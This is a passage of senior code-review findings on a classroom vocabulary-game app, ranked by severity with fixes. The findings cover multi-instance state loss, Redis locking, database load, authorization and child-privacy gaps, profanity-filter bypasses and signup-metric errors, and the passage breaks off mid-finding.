1. Room state lives in one instance's memory. `classroomSeatGate.ts:42-44` admits that `deleteGame` no-ops on other instances.
2. The end handler builds the anti-fabrication allow-list from the sync `getGame(code)?.users`. Elsewhere the code uses `getGameAsync` for the Redis-backed read, so I assume `getGame` reads memory only.
3. With two or more instances, the teacher's dashboard socket can land on a different instance from the projector socket that created the room. `joinedUserIds` then contains only `game.players`, which is "routinely EMPTY" (`classroomSeatedRoster.ts:11-15`). Every score is refused and the whole class's session is lost. Only a `warn` line is logged.
4. The same split hits `waitingStudents`. That in-memory `Map` means the teacher's lobby only lists early joiners on its own instance.
5. Each re-ask also adds another `socket.once('disconnect')` (`:129`), and empty outer-map entries are never deleted (`:130-141`). That is a slow leak plus listener build-up on long lobbies.
6. `checkRateLimit(socket.id)` is per socket and per instance, so opening N sockets multiplies the budget.

**Fix:**
- Use `await getGameAsync()` in the end handler.
- Move the waiting roster to a Redis hash keyed by code, with a TTL.
- Register the disconnect cleanup once per socket, and delete empty outer entries.
- Rate-limit on verified user id or IP in Redis.

---

## 6. End-of-session persistence is sequential, non-atomic and can't resume after a partial failure
**`classroomGamePersistence.ts:429-568`** (especially `:236-277`, `:493-500`, `:532-550`, `:588-601`) · **Medium, High at 10x**

**How it fails:**
1. For each student, it inserts a session, then for each lesson it reads and upserts progress, then for each lesson it calls the XP RPC. Everything is awaited serially.
2. At 30 students × 10 lessons, that is roughly 630 round trips, which is tens of seconds before `classroomGameEnded` reaches the hub (`classroomGameEndHandler.ts:177`).
3. A deploy or crash mid-loop leaves the 24h lock held while half the class is unwritten. Nothing retries the rest.
4. A single student's insert error is skipped with `continue` (`:499`). Because `sessionsWritten > 0`, the lock is kept and that student is never retried.
5. `upsertLessonProgress` is a read-modify-write on the whole `words_attempted` JSON. It races with the same student's solo-practice writes, which shard 23 showed are also a read-modify-write, so one side's attempts are lost.

**Fix:**
- Write one RPC per student that does the session insert, a `jsonb` merge of progress and the XP award in a single transaction.
- Run students with bounded parallelism.
- Track completion per student (a unique row on round and student) instead of one all-or-nothing lock, so a retry only fills the gaps.

---

## 7. Client-supplied `lessonIds` are never checked against the teacher
**`classroomGameSchemas.ts:19`**, **`classroomGameHandler.ts:124`**, **`classroomGamePersistence.ts:161-164, 513, 533-537`** · **Medium** (authz on writes)

**How it fails:**
1. `createClassroomGame` checks that the teacher owns `classroomId` (`:98`). It never checks that the 20 `lessonIds` belong to that teacher, or are public.
2. At the end of the game, the backend client (assumed to be service role) loads `vocabulary_lessons` for those ids.
3. It writes `student_lesson_progress` and calls `award_education_xp` with `p_lesson_id` set to lessons the teacher doesn't own. Another teacher's lesson analytics then pick up foreign rows, and XP is attributed to lessons that aren't the class's.

**Fix:** at create time, filter `lessonIds` to `teacher_id = caller OR is_public`, and reject the request if any id is dropped.

---

## 8. LogRocket session replay runs on student, teacher and parent-report surfaces
**`fe-next/app/essential-providers.tsx:159-172, 195-222`** · **Medium** (privacy and compliance)

**How it fails:**
1. `EssentialProviders` mounts on every route, including `/student`, `/education/live`, `/teacher` and `/report`. Once `analytics` consent is given, LogRocket records DOM and network traffic.
2. On a shared school Chromebook, a child clicking "accept" on the cookie banner is enough to turn it on.
3. Replays would then contain minors' names and scores. They would also capture the network responses of:
   - `/api/teacher/pro/parent-links`: signed parent-report capability paths (`parent-links/route.ts:78`).
   - The miss-gap roster.
4. Those are bearer links to a child's report, now stored with a third party. This also cuts against the site's own "we never sell / FERPA" copy.

**Fix:**
- Skip `initLogRocket` on education, student, teacher and report paths.
- Configure `network.requestSanitizer` and `responseSanitizer` to drop bodies and `Authorization`.
- Add `data-private` to roster components.

---

## 9. The Word Hunt target word and the vocab list are broadcast to every student at start
**`classroomGameHandler.ts:433-444`** (with `:133`) · **Low–Medium** (game integrity)

**How it fails:**
1. `classroomGameStarted` sends the full `game.settings`, including the teacher-pinned `targetWord`, plus `vocabularyWords` to every socket in `classroom:<id>`.
2. A student can read the hidden target, or the quiz's answer pool, in devtools. That undermines the competitive classroom modes teachers are paying for.

**Fix:** send a projection without `targetWord`, and send `vocabularyWords` only to modes that display them.

---

## 10. The Google Classroom token cookie isn't re-gated on Pro, and the callback trusts an origin built from headers
**`google-classroom/oauth/callback/route.ts:25-27`**, **`auth/callback/route.js:33-53`** · **Low**

- **Classroom callback:** this route checks only the feature flag, not `gateProTeacher`. A teacher whose Pro lapses during the 10-minute window still gets the sealed token cookie.
  - **Fix:** call `gateProTeacher()` here too, which is cheap.
- **Supabase auth callback:** `getOrigin` builds the redirect host from `x-forwarded-host` or `Host`, and that redirect carries the OAuth `code`. This is safe only if Railway or the edge overwrites those headers.
  - **Fix:** use a configured `NEXT_PUBLIC_APP_URL` origin instead of request headers.

---

**Checked and fine:**
- `tryReclaimClassroomHostSeat`: it correctly requires `verifiedUserId`.
- The seat and join gates: their ordering is sound.
- `pro-welcome-seen` and the user-scoped ownership check in `parent-links`.
- `AgeGatePromptWrapper`'s show-time marker.

**Fix order for first revenue:**
- **#2** silently empties the Pro analytics teachers pay for.
- **#1 and #3** are the access-control holes.

## Shard 6

# Senior review: backend classroom, economy, dictionary and results paths

**Scope.** These are the backend files included in this batch. I left out anything the previous pass already reported:

- handshake auth fallback
- `createClassroomGame` overwrite
- chest `grantPart` race
- silent status write
- `wordPromotion` vote reset
- `filterNovel` ignoring errors
- hint charged before the vocabulary check

Where a new finding makes one of those worse, I say so. I read the code but did not run it. Anything that depends on a caller I couldn't see is marked **unverified**.

Ranked by expected damage.

---

## 1. Wordcraft runs the bot's move search on the shared event loop (High at 10x, Medium now)

**Where:** `backend/handlers/wordcraftClassroomHandler.ts:149` calls `applyWordcraftMove`, which calls `findBestBotMove` synchronously at `backend/modules/wordcraftClassroomManager.ts:271-275`.

**How it fails:**
1. Every accepted student move triggers a full bot move search inside the socket event handler. The code's own comment at `wordcraftClassroomManager.ts:112-114` says a 9-tile rack takes "past a second". The 7-tile search is smaller but still expensive.
2. One Node process serves every room's sockets, timers, word validation and leaderboards.
3. Take one class of 30 placing a word every 10–15 seconds. That is 2–3 searches per second, each blocking the process for its whole duration.
4. With three or four Wordcraft classes at once, all on the same bell schedule, the event loop saturates:
   - Other rooms' clocks drift.
   - Socket.IO heartbeats miss and clients disconnect, then reconnect in a storm.
   - Unrelated classrooms freeze.
5. `checkRateLimit(socket.id)` limits each socket, not CPU. Reconnecting gives a client a fresh socket id.

**Fix:**
- Move the bot search to a worker pool (`worker_threads` or piscina). Emit the player's result immediately and send the bot's answer when the worker returns.
- Give the search a hard time budget, and return the best move found so far when the budget runs out.
- Cap concurrent bot searches per process.

---

## 2. The game lock is per process, has no timeout, and every economy award queues behind it (High once you run more than one instance)

**Where:**
- `backend/modules/classroomGameManager.ts:33-43` (`withClassroomGameLock`)
- `backend/modules/classroomEconomyStore.ts:85-95` (`mutateEconomy` uses the same lock)
- `classroomEconomyStore.ts:105-111`

**How it fails:**
1. **Horizontal scale.** The lock is an in-memory `Map`. Add a second instance behind the Socket.IO Redis adapter and the teacher's socket may sit on instance A while students sit on B. Both run GET, modify and SETEX on `classroom_game:<code>` concurrently. The result is the exact bug the comment describes: lost joins, and a join overwriting `playing` back to `waiting`. Nothing warns you when you scale out.
2. **No timeout.** `prev.then(fn, fn)` waits forever. With ioredis's default offline queue and no `commandTimeout`, a Redis reconnect leaves `hget` pending indefinitely. Every queued operation for that game waits behind it: joins, status changes, mode switches and every cash award. The promise chain also grows without limit.
3. **Head-of-line blocking.** Each student's economy state is its own hash field, so student A's award never needs to wait on student B's. Today all 30 students' word awards share one FIFO with the game blob. Each award costs three round trips (`hget`, `hset`, `expire`). On a managed Redis with 10–20 ms round trips, a busy round builds a visible backlog, so cash shows up seconds late.

**Fix:**
- Economy: use a per-(game, user) key, or one Lua or `WATCH` transaction on a dedicated connection per mutation. Drop the game-wide lock for economy writes.
- Game blob: use a Redis lock (`SET key token NX PX 5000` with a token-checked release), or keep the per-field data in a hash so writes stop being read-modify-write.
- Set ioredis `commandTimeout`, and wrap `fn` in `Promise.race` with a timeout inside the lock.

---

## 3. `getClassroomGame` returns null for both "doesn't exist" and "Redis failed" (Medium, can happen today)

**Where:** `classroomGameManager.ts:82-93`. Its callers:
- `:119-124`
- `classroomEconomyStore.ts:98-100`
- `classroomGameSession.ts:69-70`
- `classroomRoomLanguage.ts:24-29`

**How it fails:**
1. A GET times out, the client is briefly null, or a record fails to parse. `getClassroomGame` logs the error and returns `null`.
2. `getActiveClassroomGames` treats that null as an expired game and runs `srem` on a **live** game's code (`:121-124`).
3. `markRoundLive` only re-adds the code when the status changes (`:363`). A game already in `playing` therefore stays out of `classroom_games:<id>` for the rest of the round. Students who reload the hub see "no live game" while their class is playing.
4. `loadConfig` turns null into `resolveConfig(null)`, which yields `powerUps: true`. A teacher who switched power-ups off gets them back during the blip, and students can buy them.
5. `endClassroomGameSession` returns silently on null (`classroomGameSession.ts:70`). That is the "loud, not silent" path the comment promises. The projector code then stays joinable for the 4-hour TTL.

The previous pass saw this only in the status write. The index pruning and the config failing open are the worse consequences.

**Fix:**
- Make `getClassroomGame` throw, or return `{ status: 'missing' | 'error' }`.
- Only `srem` on a confirmed miss.
- `loadConfig` should fail closed (power-ups off, cost off) on error.
- `endClassroomGameSession` should retry, or log at error level, on a read error.

---

## 4. End-of-round results processing floods the database and silently loses XP (Medium, breaks at 10x)

**Where:** `backend/modules/supabase/gameProcessing.ts:267-280`, with the error handling at `:129-134` and `:196-203`, and the achievement write at `:164-173`.

**How it fails:**
1. `processGameResults` runs `Promise.all` across every player with no concurrency limit.
2. Each player makes about 6–8 sequential Supabase calls: ensure profile, record result, update stats, update achievements, update leaderboard, update ranked progress, log session. Cache invalidation comes after.
3. A 50-student class produces about 350 requests at once. Schools end periods on a bell, so many classes end in the same minute.
4. The PostgREST/pgbouncer pool saturates and requests time out. Every error is only logged: XP, game results and leaderboard credit are dropped with no retry or outbox.
5. `achievement_counts` is read from `statsRes.data` and then overwrites the whole column (`:166-173`). Any concurrent profile write between the read and the write is lost.

**Fix:**
- Limit concurrency to roughly 5 players at a time (e.g. with `p-limit`).
- Better: one transactional RPC per player, or one per game, that does the stats, XP, leaderboard and achievement work.
- Write failed players to a durable retry queue.
- Update achievements atomically with `jsonb` increments in SQL.

---

## 5. Auto-promotion ignores RPC errors, so community downvotes are reset on every run (Medium, data integrity and content safety)

**Where:** `backend/modules/autoPromotion.ts:151-154` (`mark_word_auto_promoted`), `:135-142` (`update_verification_result`), and `:52-66` (in-memory `isRunning`).

**How it fails:**
1. `supabase.rpc()` returns `{ error }`; it does not throw. Neither call's error is checked, so `result.promoted++` runs anyway.
2. If the mark fails (a missing function after a migration, a timeout, or RLS), the word stays in the verified-promotion queue.
3. Every later run promotes it again:
   - `addToCommunityCache` runs again.
   - `promoteWordToScores` runs again, which (as the previous pass found) upserts `likes=10, dislikes=0`.
4. Players downvote the word, and the next cron run wipes those votes. This repeats indefinitely while the metrics show steady "promoted" counts.
5. `isRunning` only protects one process. Two instances run promotion concurrently.

**Fix:**
- Check `error` on both RPCs, and throw on failure so the per-word catch counts it as failed.
- Claim the queue row before promoting: a conditional update, such as `status = 'promoting' WHERE status = 'verified'`.
- Use a Redis or DB advisory lock for the run.
- Apply the `GREATEST` fix to `wordPromotion`.

---

## 6. Word-approval store: `WATCH` on a shared connection, no TTL, and a SCAN cap that silently truncates results (Medium, breaks at 10x)

**Where:**
- `backend/redis/wordApproval.ts:84-134` (`WATCH`/`MULTI` fallback)
- `:115-118` (`set` with no expiry)
- `:139-205` (SCAN with `MAX_SCAN_ITERATIONS` at `:154-157`)

**How it fails:**
1. **Broken atomicity.** `WATCH` is scoped to the connection, but `getRedisClient()` is shared by every request.
   - When request A runs `EXEC`, it clears request B's watch. B's `MULTI`/`EXEC` then commits with no conflict check, so increments are lost.
   - The `unwatch()` in the catch (`:128`) also clears other requests' watches.
2. **Unbounded growth.** Approval keys are written without `EX` (the Lua path is **unverified**), so the keyspace only grows.
3. **Silent truncation.** `getApprovedWords` scans the whole keyspace. Once there are more keys than `MAX_SCAN_ITERATIONS × COUNT`, the loop breaks and returns a **partial** list. Which approved words are missing changes from call to call, and players see words accepted one game and rejected the next.

**Fix:**
- Remove the `WATCH` fallback. Use Lua only, or run `WATCH` on `client.duplicate()`.
- Keep approvals per language in a sorted set: `ZADD` the game id into a set per word, and `ZINCRBY lang:approvals word`. Read with `ZRANGEBYSCORE minApprovals +inf`. That needs no SCAN.
- Add a TTL to per-word data.

---

## 7. Wordcraft blank tiles accept any string up to 4 characters (Low–Medium, leaderboard and mastery integrity)

**Where:** `wordcraftClassroomHandler.ts:64` (`letter: z.string().min(1).max(4)`), and `wordcraftClassroomManager.ts:212`, which checks only non-blank tiles.

**How it fails:**
1. A modified client places a blank with `letter: "JUXT"`.
2. `claimRackTiles` accepts it because blanks can take any letter.
3. The words formed concatenate the cell strings, so a long lesson target can be built from two or three tiles.
4. The target is then marked "built" (`:344-350`) and shown on the projector ticker (`:365-376`). The teacher's mastery signal is wrong, and the move also scores word multipliers.
5. Lowercase letters skip the uppercase target match.

**Fix:**
- For blanks, require one character from the locale's tile alphabet, or a locale digraph allowlist if that is why the limit is 4.
- Uppercase the letter server-side.
- Reject any placement whose `letter` is not in the bag's letter set.

---

## 8. The dictionary quality gate is computed but never enforced (Low–Medium, the slur and garbage safeguard is decorative)

**Where:**
- `backend/modules/dictionaryImprovement/runtime.ts:270-271`, where the gate result is only logged
- `:218-225`, where the `save` insert error is never checked (supabase doesn't throw)
- `:201-215`, where `loadPrevPrecision` swallows errors
- `:83-87`, where a verifier exception counts as "holds"
- `autoPromotion.ts:60-107`, which never reads the metrics

**How it fails:**
1. Precision regresses, but the gate failure is only written to a log line.
2. `runAutoPromotion` keeps promoting in every language.
3. If the metrics insert fails silently, `loadPrevPrecision` returns `null`, and the gate reports "no-baseline" and passes forever.
4. During a Wiktionary or Jisho outage, every sampled word counts as "holds", so precision reads 1.0 exactly when nothing was checked.

**Fix:**
- Before promoting a language, read the latest `dictionary_quality_metrics` row and skip the language if the gate failed.
- Check the insert and select errors.
- Leave transient verifier errors out of the precision denominator, and skip the gate when the sample is too small.

---

## 9. Classroom identity is keyed on display names, not user ids (Low–Medium, the trust boundary is the nickname)

**Where:**
- `backend/modules/classroomSessionScores.ts:51,74-83`
- `classroomResultsExtras.ts:56-58`
- `wordcraftClassroomManager.ts:165-174`
- `wordcraftClassroomHandler.ts:143-147, 221`

**How it fails:**
1. Session totals merge names case-insensitively, but `game.users` keys on the exact name. If the join path admits both "Ana" and "ANA" (**unverified**), both students' scores add into one row, which also counts two rounds per round. That row wins the session podium.
2. Podium and session-total exclusion is by teacher **name**. A student who uses the teacher's display name is dropped from the podium and totals.
3. Wordcraft seats are keyed by username. Renaming mid-round (`updateGuestName`) deals a fresh seat whose opening rack is seeded with the first lesson target, so a student can re-roll a better rack.

**Fix:**
- Key session scores, podium exclusion and Wordcraft seats on the verified auth id, or the guest id for guests. Keep the display name as a separate field.
- Exclude the host by `isHost` or user id, not by name.

---

## What to do first

- **#3** is a code fix you can make today. Teachers can see it now: their class vanishes from the student hub, and disabled power-ups come back.
- **#1** and **#2** need to be done before you run more than one instance or more than a few concurrent classrooms.
- **#4** needs to be done before district-scale adoption, when whole schools end class on the same bell.

## Shard 7

# Senior review: findings the previous pass missed

I only had the files in this batch. I don't repeat items the earlier shards already reported: the `profileStats` race, the PWA prompt, the Enter-key double submit, the `t`-in-deps loops, missing `res.ok` in the queue, and the `xpManager` client import. Where a finding depends on code I couldn't see, I say so. There are 10 findings, most severe first.

---

## 1. The child display-name lock exists only in the client, can trap a child in onboarding, and may publish their real name
**Where:** `fe-next/components/ProfileCustomizationModal.tsx:41-42, 47, 71-73, 97, 118-124, 177`

**How it fails:**
1. `lockName = tier === 'child' && !caps.customDisplayName` (line 42). The only effect is `readOnly` on the input (line 177).
2. `handleSave` still calls `onSave(trimmedName, …)` (line 97). The server receives whatever name is in state. A child, or anyone using devtools, can drop `readOnly` and save any name. Nothing in this file shows a server check.
3. The modal can't be dismissed: `onOpenChange={() => {}}`, Escape is blocked and outside clicks are blocked.
4. Take a locked child whose `defaultName` fails validation. Examples are a Google name longer than 20 characters (`maxLength` doesn't trim a value set from code) or a name with an apostrophe (`O'Neil` fails the regex at line 71). They can't edit the name and they can't save, so onboarding is a permanent dead end.
5. While `useSocialCapabilities` is still loading, `tier` is probably `unknown`, so the lock is off. A known child can type a freeform name before caps arrive.
6. If `defaultName` comes from the OAuth profile, which I can't see from the caller, the "lock" keeps the child's real full name as a public display name. That is the personal information Families Policy forbids.

**Severity:** High. This is a compliance control on a minors product, and it causes an onboarding dead end.

**Fix:**
- In the profile-update API, reject a `display_name` change when the account is a child without `customDisplayName`.
- When `lockName` is true, ignore `defaultName` and use a generated safe handle (for example "Player 4821"), set on the server.
- Don't render the input until caps have loaded.

## 2. The public profile endpoint returns any account, including minors and classroom guests, with no visibility or age check
**Where:** `fe-next/backend/routes/playerProfile.ts:51-132` and `fe-next/backend/trpc/routers/playerProfile.ts:97-128`

**How it fails:**
1. Both endpoints are unauthenticated. They look up any UUID or username and return `display_name`, `country_code`, `avatar_config`, `created_at` and stats.
2. Shard 5 found that `getActiveClassroomGames` sends full `players` records to any classroom member. Shard 4 found that `/classroom/join` mints anonymous users on demand. Together these mean student UUIDs are easy to obtain.
3. Any student UUID resolves to a named public profile with country and join month. No `is_anonymous`, child-tier or classroom-only filter is applied.
4. Lookup by username also lets anyone enumerate accounts with a dictionary of names.

**Severity:** Medium-High. This is a privacy exposure for school and child users, the audience you are selling to.

**Fix:**
- Add a server-side gate: return 404 or a minimal stub (avatar plus level) for child-tier, anonymous and classroom-only profiles.
- Return `country_code` only for adults who opted in.
- Apply the same projection in both routers. Better, delete the Express duplicate so there is only one place to fix.

## 3. Every profile view runs two exact full-table counts, uncached on the Express path
**Where:** `fe-next/backend/routes/playerProfile.ts:84-92, 108`; `trpc/routers/playerProfile.ts:102, 116-124`

**How it fails:**
1. Each view runs `count: 'exact'` with `total_score > x` and `count: 'exact'` with `total_games >= 1` on `profiles`, then `fetchXpByMode`.
2. Postgres has to scan to count exactly. At 10× the profile rows, each public view does two scans.
3. The Express route has no cache and no rate limit. A crawler, or a script cycling UUIDs or usernames, multiplies database load. Shared `/u/…` links do the same thing as traffic grows.
4. The tRPC cache is keyed by `input.id`. The UUID form and the username form of the same player are cached separately. Every miss repeats both counts.

**Severity:** Medium. Nothing is wrong today, but this is the first endpoint to fall over at 10×.

**Fix:**
- Compute percentile from a periodically refreshed rank table or a materialized view of score buckets.
- Alternatively use `count: 'estimated'` for `totalPlayers`.
- Put the Express route behind the same `cacheAside`, keyed on the resolved `profile.id`, and add a per-IP rate limit.

## 4. Boss Battle state and outcomes live in process memory, which breaks with more than one instance or on any restart
**Where:** `fe-next/backend/services/classroomBoss/roomBoss.ts:33, 158-171`

**How it fails:**
1. `BOSSES` is a `WeakMap` keyed by the `GameState` object identity. The comment at line 158 admits the chest request may read a rehydrated copy, and a copy is a different object.
2. When the game object is rehydrated mid-round (a deploy, a Redis reload), `hitRoomBoss` and `tickRoomBoss` find no boss. Hits stop landing, attacks stop, and the projector freezes on the last view.
3. `OUTCOMES` is a module-level `Map`. If you run two Node instances behind the socket.io adapter, or the process restarts between round end and the chest request, `roomBossWon()` returns false. Students who beat the boss get the "escaped" reward.
4. A restart during the 4.5 s defeat timer (line 141) means the round never ends through that path.

**Severity:** Medium. It is invisible on one box and breaks as soon as you scale horizontally or deploy during class hours.

**Fix:**
- Store `BossState` in Redis next to the game record, keyed by `gameCode:sessionId`. The reducer is pure and serializable.
- Write the outcome to Redis or Postgres with a TTL, and have the chest path read it from there.

## 5. The profanity filter is bypassed by any attached punctuation
**Where:** `fe-next/backend/utils/profanityFilter.ts:23-24, 34-41`

**How it fails:**
1. Text is split on whitespace and each token is checked with exact `Set.has`.
2. `"shit!"`, `"fuck."`, `"(shit)"`, `"sh1t"` and `"Shit,"` are all tokens that aren't in the set, so `isProfane` returns false and `cleanProfanity` leaves them untouched.
3. Any classroom display name or chat line that goes through this filter lets these through, and the audience includes children.

**Severity:** Medium. It is a trust and safety gap on a children's product.

**Fix:**
- Keep exact-token matching, which avoids false positives in Hebrew.
- Before the lookup, normalize each token: apply NFKC, lowercase, strip leading and trailing `\p{P}\p{S}`, and map common leetspeak digits (`1→i`, `3→e`, `0→o`, `$→s`) for Latin-script tokens only.
- In `cleanProfanity`, mask the matched core and keep the surrounding punctuation.

## 6. The Teacher Pro gift form always sends `locale: 'en'`, so server-side locale inference never runs
**Where:** `fe-next/components/admin/TeacherProGrantPanel.tsx:53, 102` (contrast with the comment at lines 44-45)

**How it fails:**
1. The comment says name and locale are "inferred server-side from the access request or profile, and can be overridden".
2. `fullName` is sent as `undefined` when empty (line 101). `locale` is always sent, and its state defaults to `'en'` (line 53).
3. You gift Pro to a Hebrew or Spanish teacher without touching the dropdown. The server receives an explicit `en`, and the teacher gets an English gift email. That email is the conversion touchpoint for this teacher.
4. The preview also hard-codes `pending: false` (line 83), so you never see the email a not-yet-signed-up teacher will actually receive.

**Severity:** Low-Medium. It doesn't break anything, but it weakens the conversion email.

**Fix:**
- Initialise `locale` as `''` and add an "auto" option.
- Send `locale: locale || undefined`.
- Preview with `pending` set to a toggle, or set it from a quick lookup.

## 7. Admin "auth games" stats are a capped sample presented as 30-day totals
**Where:** `fe-next/backend/routes/admin/authSessionsService.ts:90-91, 102-108, 119-121`; `fe-next/components/admin/analytics/AuthSessionsPanel.tsx:45, 105-112`

**How it fails:**
1. The panel requests `?days=30` and no `limit`, so the default is 500 and the maximum is 1000.
2. The query takes the newest 500 rows. `totalGames`, `uniqueUsers` and `completionRate` are computed from that sample.
3. The UI labels it "30d window" and shows `totalGames` as a total. Once you pass 500 signed-in games in a month, the dashboard reads "500" whatever the real number is. `uniqueUsers` gets undercounted the most, because a few heavy players fill the sample.
4. Separately, `days=-5` passes through `Math.min`, puts `startDate` in the future and returns an empty result.

**Severity:** Medium. Your growth and retention decisions use this number.

**Fix:**
- Aggregate in SQL with an RPC (`count(*)`, `count(distinct user_id)`, grouped by mode and language) over the full window.
- Clamp `days` to the range 1–90.
- If you keep sampling, show "sampled from last N games" in the UI.

## 8. Daily-challenge stats are dropped entirely when the pre-read fails
**Where:** `fe-next/backend/routes/dailyChallenge/profileStats.ts:49-58, 64-68`

This is distinct from the race the earlier pass reported.

**How it fails:**
1. The function reads the profile before calling the atomic `increment_profile_stats` RPC.
2. The read can fail. Examples are a first-time player whose `profiles` row is created moments later, a transient PostgREST error, or `.single()` erroring on an RLS or replica lag.
3. The function then logs and returns. Score and games are never incremented, even though the RPC doesn't need the read.
4. The caller is fire-and-forget, so nothing retries. These are the first-day games that count toward DEDICATION and LOYAL_PLAYER.

**Severity:** Low-Medium. Stats and achievements are lost silently.

**Fix:** Call the RPC first and unconditionally. Do the read only to compute `newDay`, and move that into the same RPC: `unique_days_played + (last_game_at::date <> now()::date)::int`. That also closes the earlier race.

## 9. Boss damage and top-hitters are keyed by display name
**Where:** `fe-next/backend/services/classroomBoss/engine.ts:140, 263-266`; `roomBoss.ts:130, 135`

**How it fails:**
1. `damageBy[w.username]` merges every student with the same display name. Two "Sam"s or two "Noa"s is common in one class.
2. Each Sam's private `totalDmg` (roomBoss.ts:135) shows the combined total.
3. The projector's top-hitters list shows one merged entry.
4. Any reward or MVP logic that reads `damageBy` credits the wrong child. A student can also join with a classmate's name to share their credit.

**Severity:** Low. It is a fairness and integrity issue, not a crash.

**Fix:** Key on `userId`, or on socket player id, inside the engine. Carry `username` only as a display field.

## 10. The admin CSV export link sends no bearer token (verify)
**Where:** `fe-next/components/admin/TeacherAccessQueue.tsx:196-199`

**How it fails:**
1. Every other call in this panel uses `fetchWithAuth`, which adds a bearer header. The export is a plain `<a href>` navigation, which sends cookies only.
2. If `/api/admin/teacher-access/export` authenticates by bearer only, like the routes behind `fetchWithAuth`, the export returns 401 and the button silently does nothing.
3. If it accepts cookies, it works, but it is then the one admin data-export route on a different auth path. That path needs its own admin check and should reject requests without a same-site cookie.

**Severity:** Low. Check which of the two cases applies.

**Fix:** Fetch the file with `fetchWithAuth`, turn the response into a `Blob` and download it from an object URL. Confirm the route calls the same server-side admin guard as its sibling routes.

---

**Checked and not flagged:**
- `bossEntitlement.ts` fails closed to the free boss, including when `maybeSingle` errors on duplicate subscription rows.
- The email preview iframes use `sandbox=""`, which is correct.
- `AndroidAppInstallPromo` re-reads its gates at fire time and cleans up correctly.
- `NativeOAuthInitializer` is fine.
- The boss engine's double-defeat and stale-session guards hold.

## Shard 8

# Senior review: what the previous pass missed

**Scope.** This batch is admin panels, auth UI and GSI loaders. It contains no server routes, so every authz finding below stops at the client boundary and says what the server has to enforce.

**Already reported, not repeated here:** the `t` dependency refetch loops (`TeacherHealthCard`, `AdminTeacherDetail`), the missing `catch` in the Wikipedia `BulkApproveButton`, `useAdventureProgress` stuck on `'loading'`, and the `RemoveAdsProbe` fake door.

Ordered by impact on first revenue.

---

### 1. The Google button on the post-game signup sheet can render as an empty white box (High, conversion; verify against your Next version)

**Where:**
- `fe-next/components/auth/GsiClientPreloader.tsx:26-31` (script id `google-gsi-client-preload`)
- `fe-next/components/auth/GoogleSignInButton.tsx:160` (same src, id `google-gsi-client`, relies on `onReady`)
- `GoogleSignInButton.tsx:109-111`
- `fe-next/components/auth/FirstWinSignupModal.tsx:301`

**Failure scenario:**
1. A guest finishes a game on a heavy game path such as `/singleplayer`. `GoogleOneTapInitializer.tsx:125` skips loading GSI there, so GSI is not on the page yet.
2. The soft-sheet opens. `GsiClientPreloader` and `GoogleSignInButton` mount in the same commit. The preloader's `<Script>` effect runs first, injects the script and registers the src in `next/script`'s src-keyed cache.
3. The button's `<Script>` has a different `id` but the same src. As I understand Next's `loadScript`, it takes the dedupe path, which calls `onLoad` only and never `onReady`.
4. The button's mount effect (`:109-111`) has already run and found `window.google` undefined.
5. Nothing ever calls `renderButton()`. The frame stays empty. This is the bug the preloader was added to fix (t_375bffc3), and it likely now causes it.

**Same mechanism on One Tap:** `GoogleOneTapInitializer.tsx:131-144` also relies on `onReady`. If a GSI button loaded the script first, One Tap never prompts.

**Fix:**
- Put one `loadGsi(language): Promise<GoogleIdServices>` in `lib/auth/googleOneTap.ts`. It should inject the script once, resolve on load, and resolve immediately if `window.google?.accounts?.id` already exists.
- Have the button, One Tap and the preloader all await that promise instead of using `<Script onReady>`.
- Minimum patch: add `onLoad={() => void renderButton()}` next to `onReady` in the button, and the same in the One Tap initializer.

---

### 2. The Daily Challenge inline signup lacks three fixes that AuthModal already has (Medium-High, conversion and lost results)

**Where:** `fe-next/components/auth/DailyChallengeInlineSignup.tsx:174-188`, compared with `AuthModal.tsx:273-313`.

**Failure scenarios:**
1. **Returning player.** The form defaults to `'signup'` (`:81`). A player who already has an account enters their email and password. With email confirmation on, Supabase returns success with `identities: []`. The component shows "check your email" (`:185`). No email arrives. The player leaves, and the daily result saved by `savePending()` is never attached to their account.
2. **Confirmation off.** Signup returns a session. The user is signed in, but the form still shows "check your email".
3. **Sign-in success.** No branch clears `isLoading`. The spinner runs forever unless a parent happens to unmount the component on auth.
4. **Double OAuth.** The OAuth buttons check `isLoading === 'google'`, which is never set. A double-tap starts two OAuth flows.

**Fix:** Move AuthModal's submit logic (the empty-identities check, the `data.session` close, and the fallback error) into a shared `useEmailPasswordSubmit` hook and use it in both components. Use the hook's `loadingProvider` for the OAuth buttons.

---

### 3. Admin bulk word actions use a captured token and one unbounded synchronous request, and report partial success as total failure (Medium, data integrity; breaks at 10x)

**Where:**
- `fe-next/components/admin/invalid-words/AutoPromoteButton.tsx:27, 62-72, 78-80`
- `fe-next/components/admin/invalid-words/BulkApproveButton.tsx:29, 56-66, 82-85`

**Failure scenario:**
1. Both buttons take `authToken: string` as a prop, captured when the page loaded. An admin who comes back more than an hour later gets a 401. The UI shows "300 failed" or "Auto-promotion failed", which says nothing about auth.
2. Separately, auto-promote processes every candidate in one HTTP request, with Wiktionary or milog checks per word. Bulk approve does the same for every selected id. As the queue grows, the request passes the serverless timeout and returns a 504 after some words are already committed.
3. The client reports all words as failed (`:84`). `onComplete()` is not called on failure, so the list does not refresh and the same rows stay selected.
4. The admin retries. The words that already succeeded are re-promoted. Per the earlier `wordPromotion.ts:37-51` finding, each re-promotion overwrites `likes_count` and `dislikes_count` again.

**Fix:**
- Client:
  - Use `fetchWithAuth` instead of the prop token.
  - Call `onComplete()` in `finally`.
  - Show a 5xx as "result unknown, refreshing" rather than "all failed".
- Server:
  - Process at most about 50 words per call and return `{processed, remaining}`.
  - Move auto-promote to a cron or queue job.
  - Make promotion idempotent: skip words already in `word_scores`.

---

### 4. The signup funnel metric is inflated by sign-ins and unconfirmed sends (Medium, the number revenue decisions rest on)

**Where:**
- `fe-next/components/auth/AuthModal.tsx:340`
- `AuthModal.tsx:304`
- `DailyChallengeInlineSignup.tsx` (no tracking)

**Failure scenario:**
1. For players, the magic-link form is the default web path for both "Sign in" and "Sign up". Line 340 fires `funnel_sign_up` whenever a link is sent. Every returning player who signs in by link counts as a new signup, and so does every link that is never clicked.
2. Line 304 counts password signups before the email is confirmed.
3. The Daily Challenge email paths emit no event at all, so that funnel is undercounted.

Net effect: the signup-to-paid ratio you would use to judge pricing is computed from the wrong number in both directions.

**Fix:**
- Rename the client-side events to `magic_link_sent` and `signup_submitted`.
- Emit the real `sign_up` event once, from the `SIGNED_IN` handler or the profile-creation path. Fire it when the profile row is created for the first time, or when `user.created_at` is within about 2 minutes of now.

---

### 5. A failed sign-out is silently ignored, which matters on shared classroom devices (Low-Medium, session handling)

**Where:** `fe-next/components/auth/AuthButton.tsx:137-142`

**Failure scenario:**
